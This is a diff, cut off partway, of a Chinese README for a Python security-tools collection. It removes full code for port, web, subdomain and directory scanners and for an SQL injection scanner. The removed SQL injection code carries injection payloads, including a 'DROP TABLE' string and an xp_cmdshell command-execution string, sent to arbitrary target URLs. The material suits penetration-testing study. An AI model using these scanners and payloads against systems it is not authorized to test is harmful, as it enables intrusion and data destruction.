@@ -1,6 +1,7 @@
 # Small-Tools
 Python 网络安全工具，涵盖漏洞扫描、密码破解、渗透测试、数据包嗅探、取证分析等领域。每个工具都添加了 丰富的描述、实现思路，以及核心 Python 库，逐步完善所有代码，请关注官网。
 
+
 ## **一、漏洞扫描工具 🕵️‍♂️🔍**
 
 ### **1. 简易端口扫描器 🚪🔑**
@@ -15,256 +16,6 @@ Python 网络安全工具，涵盖漏洞扫描、密码破解、渗透测试、�
 - 利用线程池并发扫描多个端口。
 - 输出开放端口列表及其服务类型。
 
-```python
-import socket
-import os
-import json
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from tqdm import tqdm
-from ipaddress import ip_address
-
-def validate_host(host):
-    """
-    验证主机名是否有效。
-    :param host: 用户输入的主机名或IP
-    :return: 如果主机名有效，返回True，否则返回False
-    """
-    try:
-        socket.gethostbyname(host)  # 尝试解析主机名
-        return True
-    except socket.gaierror:
-        return False
-
-def is_private_ip(ip):
-    """
-    检查IP是否为内网地址。
-    :param ip: IP地址
-    :return: 如果是内网IP，返回True，否则返回False
-    """
-    ip = ip_address(ip)
-    return ip.is_private
-
-def parse_port_range(port_range):
-    """
-    解析用户输入的端口范围。
-    :param port_range: 例如 '1-1000'
-    :return: 端口范围的生成器
-    :raises ValueError: 当格式错误或范围无效时抛出异常
-    """
-    try:
-        start_port, end_port = map(int, port_range.split("-"))
-        if start_port < 1 or end_port > 65535 or start_port > end_port:
-            raise ValueError
-        return range(start_port, end_port + 1)
-    except ValueError:
-        raise ValueError("端口范围格式错误，必须是 '1-65535' 的形式，且范围有效。")
-
-def scan_port(host, port):
-    """
-    扫描单个端口是否开放，并尝试获取服务信息。
-    :param host: 目标主机
-    :param port: 目标端口号
-    :return: 如果开放，返回 (端口号, 服务名称, Banner 信息)，否则返回 None
-    """
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(2)  # 设置超时时间
-            result = s.connect_ex((host, port))  # 检查端口是否开放
-            if result == 0:  # 端口开放
-                try:
-                    service = socket.getservbyport(port)  # 获取服务名称
-                except OSError:
-                    service = "Unknown"  # 如果无法获取服务名称，则返回 Unknown
-                
-                # 尝试获取服务的 Banner 信息
-                banner = grab_banner(host, port)
-                return port, service, banner
-    except Exception as e:
-        pass  # 忽略其他异常
-    return None
-
-def grab_banner(host, port):
-    """
-    抓取开放端口的服务Banner。
-    :param host: 目标主机
-    :param port: 目标端口号
-    :return: 返回抓取到的服务Banner信息
-    """
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.settimeout(2)
-            s.connect((host, port))
-            s.sendall(b"\r\n")  # 发送空数据包
-            banner = s.recv(1024).decode().strip()  # 接收返回的Banner信息
-            return banner if banner else "Unknown"
-    except Exception:
-        return "Unknown"
-
-def scan_ports(host, ports, max_threads=100):
-    """
-    并发扫描指定主机的端口。
-    :param host: 目标主机
-    :param ports: 需要扫描的端口范围
-    :param max_threads: 最大线程数
-    :return: 开放端口及服务信息的列表
-    """
-    open_ports = []
-    with ThreadPoolExecutor(max_threads) as executor:
-        futures = {executor.submit(scan_port, host, port): port for port in ports}
-        for future in tqdm(as_completed(futures), total=len(ports), desc=f"扫描 {host}"):
-            try:
-                result = future.result()
-                if result:
-                    open_ports.append(result)
-                    # 实时显示扫描结果
-                    port, service, banner = result
-                    print(f"[实时发现] 主机 {host} 端口 {port} 开放: 服务 {service} | Banner: {banner}")
-            except Exception as e:
-                print(f"扫描时发生错误: {e}")
-    return open_ports
-
-def save_results(results, filename="scan_results.json"):
-    """
-    将扫描结果保存为JSON文件。
-    :param results: 扫描结果
-    :param filename: 文件名
-    """
-    try:
-        with open(filename, "w") as f:
-            json.dump(results, f, indent=4, ensure_ascii=False)
-        print(f"扫描结果已保存到 {filename}")
-    except Exception as e:
-        print(f"保存结果时发生错误: {e}")
-
-def is_admin():
-    """
-    检查当前用户是否为管理员。
-    :return: 如果是管理员返回True，否则返回False
-    """
-    try:
-        return os.getuid() == 0  # Linux 检查是否为 root
-    except AttributeError:
-        import ctypes
-        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows 检查管理员权限
-
-def scan_from_file(file_path):
-    """
-    从文件读取目标主机和端口范围，批量扫描。
-    :param file_path: 文件路径
-    """
-    try:
-        with open(file_path, "r") as f:
-            targets = json.load(f)
-    except Exception as e:
-        print(f"读取文件时发生错误：{e}")
-        return
-
-    if not isinstance(targets, list):
-        print("文件格式错误：需要包含目标主机和端口范围的列表。")
-        return
-
-    all_results = []
-    for target in targets:
-        host = target.get("host")
-        port_range = target.get("ports")
-        if not host or not port_range:
-            print(f"跳过无效目标：{target}")
-            continue
-
-        if not validate_host(host):
-            print(f"错误：无法解析主机名 {host}，跳过...")
-            continue
-
-        try:
-            ports = parse_port_range(port_range)
-        except ValueError as ve:
-            print(f"错误：目标 {host} 的端口范围无效 - {ve}，跳过...")
-            continue
-
-        print(f"\n开始扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\n")
-        results = scan_ports(host, ports)
-        if results:
-            all_results.append({"host": host, "open_ports": results})
-
-    save_results(all_results, "batch_scan_results.json")
-
-def main():
-    """
-    主函数：用户交互入口，调用扫描功能。
-    """
-    print("=== 高级端口扫描器 🚪🔑 ===")
-    mode = input("请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: ").strip()
-
-    if mode == "1":
-        host = input("请输入目标主机（IP 或域名）： ").strip()
-
-        # 验证主机名是否有效
-        if not validate_host(host):
-            print("错误：无法解析主机名，请检查输入的目标主机地址！")
-            return
-
-        # 检查是否扫描公网IP
-        if not is_private_ip(socket.gethostbyname(host)):
-            confirm = input("目标为公网IP，确定继续扫描？(y/n): ").strip().lower()
-            if confirm != "y":
-                print("已取消扫描公网IP。")
-                return
-
-        port_range = input("请输入端口范围（例如 1-1000）： ").strip()
-
-        # 解析端口范围
-        try:
-            ports = parse_port_range(port_range)
-        except ValueError as ve:
-            print(f"错误：{ve}")
-            return
-
-        # 提示用户是否具有管理员权限
-        if not is_admin():
-            print("提示：扫描低号端口（1-1024）可能需要管理员权限，当前用户可能无法扫描这些端口。")
-
-        print(f"\n正在扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\n")
-
-        try:
-            # 调用扫描功能
-            open_ports = scan_ports(host, ports)
-            if open_ports:
-                print("\n扫描完成！以下端口开放：\n")
-                for port, service, banner in open_ports:
-                    print(f"端口 {port}: {service} | Banner: {banner}")
-                
-                # 保存结果
-                save_results({"host": host, "open_ports": open_ports})
-            else:
-                print("扫描完成！未发现开放端口。")
-        except Exception as e:
-            print(f"扫描时发生错误：{e}")
-
-    elif mode == "2":
-        file_path = input("请输入包含目标的文件路径（JSON 格式）： ").strip()
-        scan_from_file(file_path)
-
-    else:
-        print("无效选项，退出。")
-
-if __name__ == "__main__":
-    main()
-```
-
-```
-#示例扫描文件
-[
-    {
-        "host": "baidu.com",
-        "ports": "80-443"
-    },
-    {
-        "host": "hackerchi.top",
-        "ports": "1-1000"
-    }
-]
-
-#实时返回数据
 === 高级端口扫描器 🚪🔑 ===
 请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: 2
 请输入包含目标的文件路径（JSON 格式）： scan_list.txt
@@ -331,274 +82,6 @@ if __name__ == "__main__":
 - 使用 `requests` 模块发送 `HEAD` 请求，获取响应头信息。
 - 分析服务器响应（如 `Server` 字段）来判断服务类型。
 
-```python
-import requests
-from urllib.parse import urlparse
-import json
-import ssl
-import socket
-
-def validate_url(url):
-    """
-    验证 URL 是否有效。
-    :param url: 用户输入的 URL
-    :return: 如果 URL 格式有效，返回 True，否则返回 False
-    """
-    try:
-        result = urlparse(url)
-        return all([result.scheme, result.netloc])  # URL 必须包含协议和主机名
-    except Exception:
-        return False
-
-def send_http_request(url, method="GET", headers=None, allow_redirects=True, timeout=10):
-    """
-    发送 HTTP 请求，获取响应状态码和头信息。
-    :param url: 目标 URL
-    :param method: HTTP 方法（默认 GET）
-    :param headers: 自定义请求头
-    :param allow_redirects: 是否允许重定向
-    :param timeout: 超时时间
-    :return: 响应状态码、头信息和正文内容
-    """
-    if headers is None:
-        # 默认请求头，模拟真实浏览器
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept": "*/*",
-        }
-
-    try:
-        response = requests.request(
-            method, url, headers=headers, allow_redirects=allow_redirects, timeout=timeout
-        )
-        return response.status_code, response.headers, response.text
-    except requests.exceptions.MissingSchema:
-        raise ValueError("URL 缺少协议，请以 http:// 或 https:// 开头！")
-    except requests.exceptions.ConnectionError:
-        raise ValueError("无法连接到目标 URL，请检查地址是否正确！")
-    except requests.exceptions.Timeout:
-        raise ValueError("请求超时，目标 URL 响应过慢！")
-    except Exception as e:
-        raise ValueError(f"发送请求时发生未知错误：{e}")
-
-def fetch_ssl_certificate_info(url):
-    """
-    获取 HTTPS 网站的 SSL/TLS 证书信息。
-    :param url: 目标 URL
-    :return: 证书信息字典
-    """
-    try:
-        parsed_url = urlparse(url)
-        hostname = parsed_url.netloc.split(":")[0]
-        port = 443  # HTTPS 默认端口
-
-        context = ssl.create_default_context()
-        with socket.create_connection((hostname, port)) as sock:
-            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
-                cert = ssock.getpeercert()
-
-        # 提取证书信息
-        return {
-            "Issuer": dict(x[0] for x in cert.get("issuer", [])),
-            "Subject": dict(x[0] for x in cert.get("subject", [])),
-            "Valid From": cert.get("notBefore"),
-            "Valid Until": cert.get("notAfter"),
-            "Serial Number": cert.get("serialNumber"),
-            "Version": cert.get("version"),
-        }
-    except Exception as e:
-        return {"Error": f"无法获取 SSL 证书信息：{e}"}
-
-def analyze_content(content):
-    """
-    分析响应内容，判断页面类型或特征。
-    :param content: 响应正文内容
-    :return: 页面内容的类型信息
-    """
-    content = content.lower()
-    if "<html" in content:
-        if "login" in content or "sign in" in content:
-            return "Login Page - 页面包含登录表单。"
-        elif "error" in content or "not found" in content:
-            return "Error Page - 页面可能是错误页。"
-        elif "<div" in content or "<span" in content:
-            return "HTML Page - 一般的 HTML 页面。"
-    elif "json" in content or "{" in content:
-        return "API Response - 页面返回 JSON 数据，可能是 API 响应。"
-    elif "<svg" in content or "<circle" in content:
-        return "SVG File - 页面返回 SVG 图像。"
-    return "Unknown Content - 无法识别的页面内容。"
-
-def interpret_status_code(status_code):
-    """
-    对 HTTP 状态码进行解释。
-    :param status_code: HTTP 状态码
-    :return: 状态码的解释信息
-    """
-    explanations = {
-        200: "OK - 请求成功，服务器返回了请求的资源。",
-        201: "Created - 请求成功并创建了新的资源。",
-        204: "No Content - 请求成功，但服务器未返回内容。",
-        301: "Moved Permanently - 资源永久重定向到新的 URL。",
-        302: "Found - 资源临时重定向到新的 URL。",
-        304: "Not Modified - 缓存的资源未改变，返回未修改的副本。",
-        400: "Bad Request - 请求格式错误，服务器无法理解。",
-        401: "Unauthorized - 未授权，需要身份验证。",
-        403: "Forbidden - 服务器拒绝执行请求。",
-        404: "Not Found - 请求的资源不存在。",
-        405: "Method Not Allowed - 请求方法被禁止。",
-        408: "Request Timeout - 请求超时，服务器未收到完整请求。",
-        500: "Internal Server Error - 服务器发生未知错误。",
-        502: "Bad Gateway - 网关或代理服务器收到无效响应。",
-        503: "Service Unavailable - 服务器暂时不可用（过载或维护中）。",
-        504: "Gateway Timeout - 网关或代理超时。",
-    }
-    return explanations.get(status_code, "Unknown Status Code - 未知状态码。")
-
-def interpret_server_type(server):
-    """
-    对服务器类型进行解释。
-    :param server: 服务器类型（响应头中的 Server 字段）
-    :return: 服务器类型的解释信息
-    """
-    server_types = {
-        "nginx": "Nginx - 一种高性能的开源 HTTP 和反向代理服务器，常用于负载均衡。",
-        "apache": "Apache - 世界上最流行的开源 Web 服务器，功能强大且灵活。",
-        "iis": "IIS - 微软开发的 Internet 信息服务，常用于运行 ASP.NET 应用程序。",
-        "cloudflare": "Cloudflare - 一种 CDN 和网络安全服务，通常用于增强网站性能和安全性。",
-        "gws": "Google Web Server - 谷歌使用的专属 Web 服务器，提供高性能服务。",
-        "litespeed": "LiteSpeed - 一种轻量级高性能 Web 服务器，专为速度优化。",
-        "openresty": "OpenResty - 基于 Nginx 的高性能 Web 平台，可扩展用于动态 Web 应用。",
-        "caddy": "Caddy - 一种自动化 HTTPS、高性能的 Web 服务器，适合开发者。",
-        "gunicorn": "Gunicorn - 一个基于 Python 的 WSGI HTTP 服务器，用于运行 Python Web 应用。",
-    }
-    for key, explanation in server_types.items():
-        if key in server.lower():
-            return explanation
-    return "Unknown - 无法确定的服务器类型。"
-
-def single_probe(url):
-    """
-    针对单个 URL 的探测，并实时输出重点内容。
-    :param url: 单个目标 URL
-    :return: 探测结果字典
-    """
-    try:
-        print(f"\n正在探测：{url}")
-        status_code, headers, content = send_http_request(url)
-
-        # 提取信息
-        status_explanation = interpret_status_code(status_code)
-        server = headers.get("Server", "Unknown")
-        server_explanation = interpret_server_type(server)
-        content_analysis = analyze_content(content)
-
-        # 获取 SSL 信息（如果是 HTTPS）
-        ssl_info = fetch_ssl_certificate_info(url) if url.startswith("https://") else {}
-
-        # 实时输出重点内容
-        print(f"状态码：{status_code} - {status_explanation}")
-        print(f"服务器类型：{server} - {server_explanation}")
-        print(f"页面内容分析：{content_analysis}")
-        if ssl_info:
-            print("SSL/TLS 证书信息：")
-            for key, value in ssl_info.items():
-                print(f"  {key}: {value}")
-
-        # 返回结果
-        return {
-            "URL": url,
-            "Status Code": status_code,
-            "Status Explanation": status_explanation,
-            "Server": server,
-            "Server Explanation": server_explanation,
-            "Content Analysis": content_analysis,
-            "SSL Info": ssl_info,
-        }
-    except ValueError as ve:
-        print(f"错误：{ve}")
-        return {"URL": url, "Error": str(ve)}
-    except Exception as e:
-        print(f"未知错误：{e}")
-        return {"URL": url, "Error": str(e)}
-
-def batch_probe(urls):
-    """
-    批量探测多个 URL，并实时输出重点内容。
-    :param urls: URL 列表
-    :return: 每个 URL 的探测结果（列表）
-    """
-    results = []
-    for url in urls:
-        result = single_probe(url)
-        results.append(result)
-    return results
-
-def save_results(results, filename="web_probe_results.json"):
-    """
-    将探测结果保存为 JSON 文件。
-    :param results: 探测结果
-    :param filename: 文件名
-    """
-    try:
-        with open(filename, "w") as f:
-            json.dump(results, f, indent=4, ensure_ascii=False)
-        print(f"探测结果已保存到文件：{filename}")
-    except Exception as e:
-        print(f"保存结果时发生错误：{e}")
-
-def load_urls_from_file(filename):
-    """
-    从文件中加载 URL 列表。
-    :param filename: 文件名
-    :return: URL 列表
-    """
-    try:
-        with open(filename, "r") as f:
-            urls = [line.strip() for line in f if line.strip()]
-        if not urls:
-            raise ValueError("文件中没有有效的 URL！")
-        return urls
-    except FileNotFoundError:
-        print(f"错误：文件 {filename} 不存在！")
-        return []
-    except Exception as e:
-        print(f"加载文件时发生错误：{e}")
-        return []
-
-def main():
-    """
-    主函数：用户交互入口，支持单个 URL 探测和批量 URL 探测。
-    """
-    print("=== Web 服务探测工具 🌐🛠 ===")
-    mode = input("请选择模式（1: 单个 URL 探测，2: 批量 URL 探测）： ").strip()
-
-    if mode == "1":
-        # 单个 URL 探测
-        url = input("请输入目标 URL（例如 https://example.com）： ").strip()
-        if not validate_url(url):
-            print("错误：输入的 URL 无效，请输入有效的 URL！")
-            return
-        single_probe(url)
-    elif mode == "2":
-        # 批量 URL 探测
-        filename = input("请输入包含 URL 列表的文件名： ").strip()
-        urls = load_urls_from_file(filename)
-        if not urls:
-            return
-
-        print(f"\n共加载 {len(urls)} 个 URL，正在探测中...\n")
-        results = batch_probe(urls)
-        save_results(results)
-    else:
-        print("错误：无效的模式选择！")
-
-if __name__ == "__main__":
-    main()
-```
-
-```
 #实例网址文件
 https://www.baidu.com
 
@@ -645,96 +128,6 @@ https://www.baidu.com
 - 使用常见的子域字典生成可能的子域组合。
 - 通过 DNS 查询验证子域是否存在（如解析成功）。
 
-```python
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
-import socket
-from concurrent.futures import ThreadPoolExecutor, as_completed
-import os
-
-def dns_lookup(subdomain):
-    try:
-        # 执行 A 记录查询
-        socket.gethostbyname(subdomain)
-        return True
-    except socket.gaierror:
-        # 域名没有 IP 地址或者该记录不是 A 记录
-        return False
-
-def generate_subdomains(target_domain, wordlist):
-    with open(wordlist, 'r', encoding='utf-8') as file:
-        for line in file.readlines():
-            yield '{}.{}'.format(line.strip(), target_domain)
-
-def generate_common_subdomains(target_domain):
-    common_prefixes = [
-        "www", "mail", "admin", "test", "dev", "staging",
-        "ftp", "blog", "api", "support", "forum", "shop"
-    ]
-    for prefix in common_prefixes:
-        yield '{}.{}'.format(prefix, target_domain)
-
-def main():
-    # 用户输入目标域名
-    target_domain = input("请输入要扫描的目标域名（例如 example.com）：").strip()
-    
-    if not target_domain:
-        print("未输入有效的域名。")
-        return
-    
-    # 生成子域名列表
-    subdomains = set()
-    
-    # 使用预定义的常见子域前缀
-    subdomains.update(generate_common_subdomains(target_domain))
-    
-    # 如果存在自定义字典文件，则添加这些子域
-    wordlist_path = 'wordlist.txt'
-    if os.path.exists(wordlist_path):
-        print(f"使用自定义字典文件 {wordlist_path} 生成更多子域名。")
-        subdomains.update(generate_subdomains(target_domain, wordlist_path))
-    else:
-        print("未找到自定义字典文件，仅使用预定义的常见子域前缀。")
-    
-    # 进行 DNS 查询
-    with ThreadPoolExecutor(max_workers=100) as executor:
-        futures = {executor.submit(dns_lookup, subdomain): subdomain for subdomain in subdomains}
-        
-        for future in as_completed(futures):
-            subdomain = futures[future]
-            try:
-                if future.result():
-                    print('[+] {} 存在'.format(subdomain))
-                else:
-                    print('[-] {} 不存在'.format(subdomain))
-            except Exception as e:
-                print('[-] 查询 {} 时发生错误: {}'.format(subdomain, e))
-
-if __name__ == '__main__':
-    main()
-    
-```
-
-```python
-#自定义字典
-www
-mail
-admin
-test
-dev
-staging
-ftp
-blog
-api
-support
-forum
-shop
-```
-
-![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/3294c5c5-2d0a-4fc7-9251-17a9d9c1ddfb/image.png)
-
----
 
 ### **4. 文件与目录枚举工具 📂🗂️**
 
@@ -747,62 +140,6 @@ shop
 - 使用路径字典（如 `/admin`, `/backup.zip`）枚举可能路径。
 - 检查 HTTP 响应是否为 200 或 403，判断资源是否存在。
 
-```python
-import requests
-
-# 定义目标URL和默认路径字典
-target_url = "http://example.com"
-default_paths_to_test = [
-    "/admin",
-    "/backup.zip",
-    "/.htaccess",
-    "/config.php",
-    "/robots.txt",
-    # 添加更多可能的路径
-]
-
-def enum_files_and_dirs(base_url, paths, custom_dict=None):
-    if custom_dict:
-        paths += custom_dict
-
-    for path in paths:
-        full_url = f"{base_url}{path}"
-        try:
-            response = requests.get(full_url)
-            status_code = response.status_code
-            if status_code == 200:
-                print(f"[+] Found: {full_url} (Status Code: {status_code})")
-            elif status_code == 403:
-                print(f"[!] Forbidden: {full_url} (Status Code: {status_code})")
-            elif status_code == 401:
-                print(f"[!] Unauthorized: {full_url} (Status Code: {status_code})")
-            elif status_code == 404:
-                pass  # 静默忽略404状态码，表示资源不存在
-            else:
-                print(f"[-] Other: {full_url} (Status Code: {status_code})")
-        except requests.RequestException as e:
-            print(f"[-] Error accessing {full_url}: {e}")
-
-if __name__ == "__main__":
-    # 使用默认路径字典进行扫描
-    enum_files_and_dirs(target_url, default_paths_to_test)
-    
-    # 如果需要使用自定义路径字典，可以传递一个列表给custom_dict参数
-    custom_paths = [
-        "/secret",
-        "/hidden",
-        "/.git",
-        # 添加更多自定义路径
-    ]
-    enum_files_and_dirs(target_url, default_paths_to_test, custom_dict=custom_paths)
-```
-
-![不能突破网站的防恶意检测，有误报。](https://prod-files-secure.s3.us-west-2.amazonaws.com/dcfc0b10-f3f6-4bfe-a7f8-895b46badeca/173fcbc4-245a-47c3-add5-9518fec55a71/image.png)
-
-不能突破网站的防恶意检测，有误报。
-
----
-
 ### **5. SQL 注入检测工具 💉🗄️**
 
 **作用**：检测目标网站是否存在 SQL 注入漏洞。
@@ -814,367 +151,606 @@ if __name__ == "__main__":
 - 构造常见的 SQL 注入 Payload（如 `' OR 1=1 --`）。
 - 检测返回页面是否包含数据库错误信息或异常。
 
-```python
-#SQL注入检测工具
-import requests
-import re
-from urllib.parse import urljoin, quote
-import time
-import json
-from typing import Dict, List, Tuple
-from dataclasses import dataclass
-from enum import Enum
+### **6. XSS 漏洞检测工具 💣📜**
 
-class VulnType(Enum):
-    ERROR_BASED = "错误注入"
-    UNION_BASED = "联合查询注入"
-    BOOLEAN_BASED = "布尔注入"
-    TIME_BASED = "时间盲注"
-    STACK_QUERY = "堆叠查询注入"
-    BLIND = "盲注"
+**作用**：检测目标网站是否存在跨站脚本攻击（XSS）漏洞。
 
-@dataclass
-class VulnResult:
-    type: VulnType
-    parameter: str
-    payload: str
-    description: str
-    poc: str
-    risk_level: str
-    details: Dict
-    recommendations: List[str]
+**关键库**：`requests`, `BeautifulSoup`
 
-class SQLInjectionScanner:
-    def __init__(self):
-        self._load_payloads()
-        self._load_patterns()
-        self.headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        }
-        self.timeout = 10
-        self.delay = 0.5
+**实现思路**：
 
-    def _load_payloads(self):
-        # 分类存储不同类型的payload
-        self.payloads = {
-            VulnType.ERROR_BASED: [
-                "'''", 
-                "'))", 
-                "\"\"\"",
-                "%%",
-                "--", 
-                "#",
-                "/*!12345SELECT*/",
-            ],
-            VulnType.UNION_BASED: [
-                " UNION ALL SELECT NULL--",
-                " UNION ALL SELECT NULL,NULL--",
-                " UNION ALL SELECT NULL,NULL,NULL--",
-                ") UNION SELECT NULL,NULL,NULL--",
-                "' UNION SELECT version(),user(),database()--",
-            ],
-            VulnType.BOOLEAN_BASED: [
-                "' AND '1'='1",
-                "' AND '1'='2",
-                "' OR '1'='1",
-                "1' AND sleep(0)='0",
-                "1' AND 1=1--",
-            ],
-            VulnType.TIME_BASED: [
-                "'; WAITFOR DELAY '0:0:5'--",
-                "'); WAITFOR DELAY '0:0:5'--",
-                "' OR sleep(5)--",
-                "' AND sleep(5)--",
-                "BENCHMARK(5000000,MD5(1))",
-            ],
-            VulnType.STACK_QUERY: [
-                "; DROP TABLE temp--",
-                "; SELECT @@version--",
-                "; EXEC xp_cmdshell 'ping 127.0.0.1'--",
-            ]
-        }
+- 注入常见的恶意 JavaScript 脚本（如 `<script>alert(1)</script>`）。
+- 检查页面是否回显或执行恶意脚本。
 
-    def _load_patterns(self):
-        self.error_patterns = {
-            'mysql': [
-                r"SQL syntax.*?MySQL",
-                r"Warning.*?\Wmysqli?_",
-                r"MySQLSyntaxErrorException",
-                r"valid MySQL result",
-                r"check the manual that (corresponds to|fits) your MySQL server version",
-            ],
-            'postgresql': [
-                r"PostgreSQL.*?ERROR",
-                r"Warning.*?\Wpg_",
-                r"valid PostgreSQL result",
-                r"Npgsql\.",
-            ],
-            'mssql': [
-                r"Driver.*? SQL[\-\_\ ]*Server",
-                r"OLE DB.*? SQL Server",
-                r"\bSQL Server[^&lt;&quot;]+Driver",
-                r"Warning.*?\W(mssql|sqlsrv)_",
-                r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
-            ],
-            'oracle': [
-                r"\bORA-[0-9][0-9][0-9][0-9]",
-                r"Oracle error",
-                r"Oracle.*?Driver",
-                r"Warning.*?\W(oci|ora)_",
-            ],
-            'sqlite': [
-                r"SQLite/JDBCDriver",
-                r"SQLite\.Exception",
-                r"System\.Data\.SQLite\.SQLiteException",
-                r"Warning.*?\Wsqlite_",
-            ]
-        }
+---
 
-    def scan_url(self, url: str) -> List[VulnResult]:
-        print(f"\n[*] 开始扫描: {url}")
-        results = []
-        
-        try:
-            # 基础信息收集
-            base_response = self._send_request(url)
-            base_length = len(base_response.text) if base_response else 0
-            
-            # 获取参数列表
-            params = self._get_parameters(url)
-            if not params:
-                params = ['id', 'page', 'user', 'username', 'search']
-            
-            # 测试每个参数
-            for param in params:
-                param_results = self._test_parameter(url, param, base_length)
-                results.extend(param_results)
-                
-        except Exception as e:
-            print(f"[!] 扫描过程中出错: {str(e)}")
-            
-        return self._analyze_results(results)
+### **7. HTTP 参数污染检测工具 🧪🔗**
 
-    def _test_parameter(self, url: str, param: str, base_length: int) -> List[VulnResult]:
-        results = []
-        print(f"[+] 测试参数: {param}")
+**作用**：测试目标网站对重复参数的处理是否正确。
 
-        for vuln_type, payloads in self.payloads.items():
-            for payload in payloads:
-                try:
-                    test_url = self._inject_payload(url, param, payload)
-                    start_time = time.time()
-                    response = self._send_request(test_url)
-                    response_time = time.time() - start_time
-                    
-                    if not response:
-                        continue
+**关键库**：`requests`
 
-                    result = self._check_vulnerability(
-                        vuln_type,
-                        param,
-                        payload,
-                        response,
-                        base_length,
-                        response_time
-                    )
-                    
-                    if result:
-                        results.append(result)
-                        
-                except Exception as e:
-                    print(f"[!] 测试payload时出错: {str(e)}")
-                    continue
-                
-                time.sleep(self.delay)
-        
-        return results
+**实现思路**：
 
-    def _check_vulnerability(
-        self, 
-        vuln_type: VulnType,
-        param: str,
-        payload: str,
-        response,
-        base_length: int,
-        response_time: float
-    ) -> VulnResult:
-        
-        # 检测基于错误的注入
-        if vuln_type == VulnType.ERROR_BASED:
-            for dbms, patterns in self.error_patterns.items():
-                for pattern in patterns:
-                    if re.search(pattern, response.text, re.I):
-                        return VulnResult(
-                            type=vuln_type,
-                            parameter=param,
-                            payload=payload,
-                            description=f"发现{dbms}数据库错误信息泄露",
-                            poc=f"{param}={payload}",
-                            risk_level="高",
-                            details={
-                                "数据库类型": dbms,
-                                "错误信息": re.search(pattern, response.text, re.I).group(0)
-                            },
-                            recommendations=[
-                                "1. 关闭生产环境的错误显示",
-                                "2. 使用参数化查询",
-                                "3. 实施输入验证和转义"
-                            ]
-                        )
+- 构造重复的 URL 参数（如 `?id=1&id=2`）。
+- 分析响应结果，判断是否存在异常行为。
 
-        # 检测基于时间的注入
-        if vuln_type == VulnType.TIME_BASED and response_time > 5:
-            return VulnResult(
-                type=vuln_type,
-                parameter=param,
-                payload=payload,
-                description="发现基于时间的SQL注入漏洞",
-                poc=f"{param}={payload}",
-                risk_level="中",
-                details={
-                    "响应时间": f"{response_time:.2f}秒"
-                },
-                recommendations=[
-                    "1. 使用参数化查询",
-                    "2. 限制SQL语句执行时间",
-                    "3. 实施WAF防护"
-                ]
-            )
+---
 
-        # 检测基于联合查询的注入
-        if vuln_type == VulnType.UNION_BASED:
-            if len(response.text) > base_length * 2 or 'UNION' in response.text:
-                return VulnResult(
-                    type=vuln_type,
-                    parameter=param,
-                    payload=payload,
-                    description="发现基于UNION的SQL注入漏洞",
-                    poc=f"{param}={payload}",
-                    risk_level="高",
-                    details={
-                        "响应长度": len(response.text),
-                        "基准长度": base_length
-                    },
-                    recommendations=[
-                        "1. 使用ORM或参数化查询",
-                        "2. 实施输入验证",
-                        "3. 最小权限原则配置数据库账号"
-                    ]
-                )
+### **8. HTTP Header 安全检测工具 🛡️📄**
 
-        # 检测布尔注入
-        if vuln_type == VulnType.BOOLEAN_BASED:
-            true_payload = payload.replace("'1'='2", "'1'='1")
-            false_payload = payload.replace("'1'='1", "'1'='2")
-            
-            true_response = self._send_request(self._inject_payload(response.url, param, true_payload))
-            false_response = self._send_request(self._inject_payload(response.url, param, false_payload))
-            
-            if true_response and false_response and \
-               abs(len(true_response.text) - len(false_response.text)) > 100:
-                return VulnResult(
-                    type=vuln_type,
-                    parameter=param,
-                    payload=payload,
-                    description="发现基于布尔的SQL注入漏洞",
-                    poc=f"{param}={payload}",
-                    risk_level="中",
-                    details={
-                        "TRUE响应长度": len(true_response.text),
-                        "FALSE响应长度": len(false_response.text)
-                    },
-                    recommendations=[
-                        "1. 使用参数化查询",
-                        "2. 实施输入验证",
-                        "3. 统一错误响应"
-                    ]
-                )
+**作用**：分析 HTTP 响应头的安全配置，检测是否缺失关键头信息。
 
-        return None
+**关键库**：`requests`
 
-    def _send_request(self, url: str) -> requests.Response:
-        try:
-            return requests.get(
-                url,
-                headers=self.headers,
-                timeout=self.timeout,
-                verify=False
-            )
-        except:
-            return None
+**实现思路**：
 
-    def _get_parameters(self, url: str) -> List[str]:
-        params = []
-        if '?' in url:
-            query = url.split('?')[1]
-            for param in query.split('&'):
-                if '=' in param:
-                    params.append(param.split('=')[0])
-        return params
+- 提取常见安全头（如 `X-Frame-Options`, `Content-Security-Policy`）。
+- 提示未配置或配置错误的安全头。
 
-    def _inject_payload(self, url: str, param: str, payload: str) -> str:
-        encoded_payload = quote(payload)
-        if '?' not in url:
-            return f"{url}?{param}={encoded_payload}"
-        
-        base_url = url.split('?')[0]
-        query = url.split('?')[1]
-        new_params = []
-        param_found = False
-        
-        for p in query.split('&'):
-            if p.startswith(f"{param}="):
-                new_params.append(f"{param}={encoded_payload}")
-                param_found = True
-            else:
-                new_params.append(p)
-        
-        if not param_found:
-            new_params.append(f"{param}={encoded_payload}")
-        
-        return f"{base_url}?{'&'.join(new_params)}"
+---
 
-    def _analyze_results(self, results: List[VulnResult]) -> List[VulnResult]:
-        # 去重和结果分析
-        unique_results = {}
-        for result in results:
-            key = f"{result.type}_{result.parameter}"
-            if key not in unique_results:
-                unique_results[key] = result
-            
-        return list(unique_results.values())
+### **9. 网站指纹识别工具 🔍🛠️**
 
-def main():
-    scanner = SQLInjectionScanner()
-    url = input("请输入要扫描的URL: ")
-    
-    if not url.startswith(('http://', 'https://')):
-        url = 'http://' + url
-    
